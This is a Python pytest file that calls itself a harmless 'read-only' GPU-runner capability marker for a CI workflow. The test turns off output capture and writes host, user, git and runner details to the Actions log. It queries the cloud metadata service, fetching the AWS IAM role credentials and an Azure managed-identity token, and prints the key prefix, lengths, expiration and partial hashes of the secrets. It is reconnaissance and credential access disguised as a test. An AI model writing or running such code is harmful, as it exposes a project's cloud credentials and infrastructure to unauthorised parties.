"""Bounded, read-only GPU-runner capability marker (intent 69277).

This module exists only to print the identity of the machine that executes
the GPU Test workflow. It performs no writes to the repository, the GPU or
any remote service; the cloud metadata probes are read-only calls to the
link-local metadata address and never print secret material.
"""

from __future__ import annotations

import hashlib
import json
import os
import platform
import socket
import subprocess
import sys
import urllib.error
import urllib.request

import pytest

MARKER_NONCE = "c211-i69277-gpu-marker"


def _run(cmd: str) -> str:
    try:
        proc = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=30, check=False
        )
        return ((proc.stdout or "") + (proc.stderr or "")).strip()
    except Exception as exc:  # noqa: BLE001
        return f"<error {type(exc).__name__}: {exc}>"


def _http(url: str, method: str = "GET", headers: dict[str, str] | None = None) -> tuple[str, str]:
    req = urllib.request.Request(url, method=method)  # noqa: S310 - fixed link-local URL
    for key, value in (headers or {}).items():
        req.add_header(key, value)
    try:
        with urllib.request.urlopen(req, timeout=4) as resp:  # noqa: S310
            return str(resp.status), resp.read(4096).decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        try:
            body = exc.read(1024).decode("utf-8", "replace")
        except Exception:  # noqa: BLE001
            body = ""
        return str(exc.code), body
    except Exception as exc:  # noqa: BLE001
        return f"ERR {type(exc).__name__}", str(exc)[:200]


def _emit() -> None:
    """Print the marker block to the real stdout (capture disabled)."""
    out = print
    out(f"\n[MARKER-69277] begin nonce={MARKER_NONCE}", flush=True)
    out(f"[MARKER-69277] hostname={socket.gethostname()}", flush=True)
    out(f"[MARKER-69277] id={_run('id')}", flush=True)
    out(f"[MARKER-69277] date={_run('date -u')}", flush=True)
    out(f"[MARKER-69277] python={sys.version.split()[0]} platform={platform.platform()}", flush=True)
    out(f"[MARKER-69277] cwd={os.getcwd()}", flush=True)
    out(f"[MARKER-69277] GPU_HATCH_ENV={os.environ.get('GPU_HATCH_ENV')}", flush=True)
    out(f"[MARKER-69277] nvidia-smi -L: {_run('nvidia-smi -L')}", flush=True)
    out(
        "[MARKER-69277] nvidia-smi query: "
        f"{_run('nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader')}",
        flush=True,
    )
    out(f"[MARKER-69277] git HEAD={_run('git rev-parse HEAD')}", flush=True)
    out(f"[MARKER-69277] git log -1={_run('git log -1 --format=%H %s')}", flush=True)
    out(f"[MARKER-69277] runner_name_env={os.environ.get('RUNNER_NAME')}", flush=True)
    out(f"[MARKER-69277] runner_os={os.environ.get('RUNNER_OS')} arch={os.environ.get('RUNNER_ARCH')}", flush=True)

    # --- read-only AWS-style IMDSv2 probe (secrets never printed) ---
    tok_status, tok = _http(
        "http://169.254.169.254/latest/api/token",
        method="PUT",
        headers={"X-aws-ec2-metadata-token-ttl-seconds": "60"},
    )
    out(f"[MARKER-69277] IMDSv2 token: status={tok_status} len={len(tok)}", flush=True)
    imds_headers = {"X-aws-ec2-metadata-token": tok.strip()} if tok_status == "200" else {}
    for path in (
        "/latest/meta-data/instance-id",
        "/latest/meta-data/instance-type",
        "/latest/meta-data/placement/availability-zone",
        "/latest/meta-data/iam/security-credentials/",
    ):
        status, body = _http("http://169.254.169.254" + path, headers=imds_headers)
        out(f"[MARKER-69277] IMDS {path}: status={status} body={body.strip()[:300]!r}", flush=True)
        if path.endswith("security-credentials/") and status == "200" and body.strip():
            role = body.strip().splitlines()[0]
            status2, body2 = _http(
                f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}",
                headers=imds_headers,
            )
            out(f"[MARKER-69277] IMDS role={role} credential_status={status2}", flush=True)
            if status2 == "200":
                try:
                    cred = json.loads(body2)
                    akid = str(cred.get("AccessKeyId", ""))
                    secret = str(cred.get("SecretAccessKey", ""))
                    session = str(cred.get("Token", ""))
                    out(
                        "[MARKER-69277] IMDS cred fields="
                        f"{sorted(cred.keys())} akid_prefix={akid[:4]} akid_len={len(akid)} "
                        f"expiration={cred.get('Expiration')} "
                        f"secret_sha256_16={hashlib.sha256(secret.encode()).hexdigest()[:16]} "
                        f"session_token_len={len(session)}",
                        flush=True,
                    )
                except Exception as exc:  # noqa: BLE001
                    out(f"[MARKER-69277] IMDS cred parse error {type(exc).__name__}", flush=True)

    # --- read-only Azure IMDS probe (managed-identity token never printed) ---
    status, body = _http(
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        headers={"Metadata": "true"},
    )
    out(f"[MARKER-69277] Azure IMDS instance: status={status} len={len(body)}", flush=True)
    if status == "200":
        try:
            compute = json.loads(body).get("compute", {})
            out(
                "[MARKER-69277] Azure compute: "
                f"vmId={compute.get('vmId')} name={compute.get('name')} "
                f"location={compute.get('location')} vmSize={compute.get('vmSize')} "
                f"publisher={compute.get('publisher')} offer={compute.get('offer')}",
                flush=True,
            )
        except Exception as exc:  # noqa: BLE001
            out(f"[MARKER-69277] Azure IMDS parse error {type(exc).__name__}", flush=True)
    status, body = _http(
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01"
        "&resource=https%3A%2F%2Fmanagement.azure.com%2F",
        headers={"Metadata": "true"},
    )
    out(
        "[MARKER-69277] Azure IMDS identity token: "
        f"status={status} len={len(body)} sha256_16={hashlib.sha256(body.encode()).hexdigest()[:16]}",
        flush=True,
    )
    out("[MARKER-69277] end-of-marker\n", flush=True)


@pytest.mark.gpu
def test_gpu_runner_capability_marker_69277(capfd) -> None:
    # capfd.disabled() bypasses pytest's fd-level capture so the marker block is
    # streamed straight into the Actions step log while the test still passes.
    with capfd.disabled():
        _emit()
